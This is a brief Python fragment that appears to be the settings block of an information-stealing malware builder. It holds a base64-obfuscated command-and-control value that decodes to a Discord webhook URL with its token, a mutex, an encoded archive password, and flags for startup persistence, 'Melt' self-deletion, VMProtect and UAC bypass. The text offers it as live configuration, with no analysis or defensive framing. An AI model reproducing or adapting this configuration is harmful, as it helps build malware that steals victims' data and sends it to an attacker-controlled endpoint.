...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMjExMjY2NzI0Njk4NTI0Ny94T0hnYlhickJWSm1JbUtDcXhKMFN4V2d0cnpNcFRpa2czTm05SUlrUEtOdlJMUlRmWUdjNFBZdUpFQ2o4VlFMZ3ljbA==').decode())
    Mutex = base64.b64decode('dEI1dVhrVEdyRXpLMXNwbQ==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('QXJteTg1MDI=').decode()
